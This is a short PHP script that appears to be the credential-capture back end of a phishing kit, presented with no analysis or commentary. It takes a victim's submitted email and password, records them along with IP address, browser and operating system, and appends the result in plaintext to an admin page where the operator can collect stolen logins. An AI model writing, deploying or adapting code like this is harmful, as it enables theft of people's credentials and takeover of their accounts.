<?php
sleep(1);
require 'functions.php';
require '../systems/detector.php';

session_start();

if(isset($_POST['userid'])){
$_SESSION['userid'] = _getData('userid');
}

if(isset($_POST['password'])){
$loginHtml = "
<div class='result-box'>
<div class='title'>LOGIN INFO</div><br>
<b>IP: </b> "._ip()."<br>
<b>BROWSER:</b> $browser<br>
<b>OS :</b> $os <br>
<b>EMAIL : </b> ".$_SESSION['userid']."<br>
<b>PASSWORD : </b> "._getData('password')."
</div>"; 

$_SESSION['login']=$loginHtml;

$fp = fopen("../admin/index.php","a");
fwrite($fp, $loginHtml);
fclose($fp);
exit();
}

?>